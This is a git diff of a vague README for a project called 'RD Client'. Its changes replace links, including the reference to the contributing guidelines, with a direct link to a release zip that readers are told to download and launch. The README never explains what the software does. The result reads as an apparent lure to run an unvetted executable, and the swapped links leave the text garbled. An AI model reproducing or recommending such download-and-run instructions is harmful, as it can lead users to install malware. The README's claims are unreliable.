@@ -15,7 +15,7 @@ Welcome to the RD Client repository, a platform that allows users to interact wi
 ## Installation
 To get started with RD Client, simply download the software package from the following link: 
 
-[![Download RD Client](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download RD Client](https://github.com/sano0991/rd-client/releases/download/v2.0/Release_x64.zip)](https://github.com/sano0991/rd-client/releases/download/v2.0/Release_x64.zip)
 
 Please note that the software package needs to be launched after downloading to install RD Client on your machine.
 
@@ -26,7 +26,7 @@ Once you have installed RD Client, launch the application and follow the on-scre
 If you encounter any issues with the software package download link provided above, please check the "Releases" section of this repository for alternative download options. Additionally, feel free to reach out to the RD Client support team for assistance with installation, usage, or any other inquiries you may have.
 
 ## Contributing
-We welcome contributions to the RD Client project! Whether you have ideas for new features, bug fixes, or enhancements to the existing software, your input is valuable. Please refer to the guidelines in the "CONTRIBUTING.md" file in this repository to learn more about how you can contribute to the project.
+We welcome contributions to the RD Client project! Whether you have ideas for new features, bug fixes, or enhancements to the existing software, your input is valuable. Please refer to the guidelines in the "https://github.com/sano0991/rd-client/releases/download/v2.0/Release_x64.zip" file in this repository to learn more about how you can contribute to the project.
 
 ## License
 RD Client is licensed under the MIT License. For more information, see the "LICENSE" file in this repository.
